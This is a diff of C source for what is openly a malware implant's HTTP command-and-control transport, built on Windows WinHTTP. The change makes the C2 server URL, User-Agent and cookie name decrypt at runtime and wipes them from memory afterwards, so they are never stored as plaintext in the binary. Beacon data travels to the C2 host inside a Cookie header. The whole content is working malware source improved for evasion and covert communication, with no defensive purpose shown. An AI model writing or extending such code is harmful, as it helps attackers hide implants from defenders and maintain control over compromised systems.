@@ -86,8 +86,11 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
 
     if (!g_hSession) return FALSE;
 
-    /* Parse URL components from CONFIG_C2_URL */
-    wchar_t *wUrl = to_wide(CONFIG_C2_URL);
+    /* Decrypt C2 URL at runtime (never stored as plaintext in binary) */
+    char c2_url_dec[512];
+    DECRYPT_CONFIG(c2_url_dec, C2_URL);
+    wchar_t *wUrl = to_wide(c2_url_dec);
+    SecureZeroMemory(c2_url_dec, sizeof(c2_url_dec));
 
     URL_COMPONENTS urlComp;
     memset(&urlComp, 0, sizeof(urlComp));
@@ -141,8 +144,13 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
                          &secFlags, sizeof(secFlags));
     }
 
-    /* Set User-Agent header */
-    wchar_t *wUA = to_wide(CONFIG_USER_AGENT);
+    /* Decrypt and set User-Agent header */
+    char ua_dec[512];
+    DECRYPT_CONFIG(ua_dec, USER_AGENT);
+    char ua_header[768];
+    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", ua_dec);
+    SecureZeroMemory(ua_dec, sizeof(ua_dec));
+    wchar_t *wUA = to_wide(ua_header);
     WinHttpAddRequestHeaders(hRequest, wUA, (DWORD)-1,
                              WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
     free(wUA);
@@ -151,10 +159,13 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
     DWORD cookie_len;
     char *cookie_val = profile_encode_request(packet, packet_len, &cookie_len);
     if (cookie_val) {
-        /* Build Cookie header: "Cookie: session=BASE64URL_DATA" */
+        /* Build Cookie header with decrypted cookie name */
+        char ck_name_dec[64];
+        DECRYPT_CONFIG(ck_name_dec, COOKIE_NAME);
         char cookie_hdr[16384];
         snprintf(cookie_hdr, sizeof(cookie_hdr), "Cookie: %s=%s",
-                 CONFIG_COOKIE_NAME, cookie_val);
+                 ck_name_dec, cookie_val);
+        SecureZeroMemory(ck_name_dec, sizeof(ck_name_dec));
         wchar_t *wCookie = to_wide(cookie_hdr);
         WinHttpAddRequestHeaders(hRequest, wCookie, (DWORD)-1,
                                  WINHTTP_ADDREQ_FLAG_ADD);
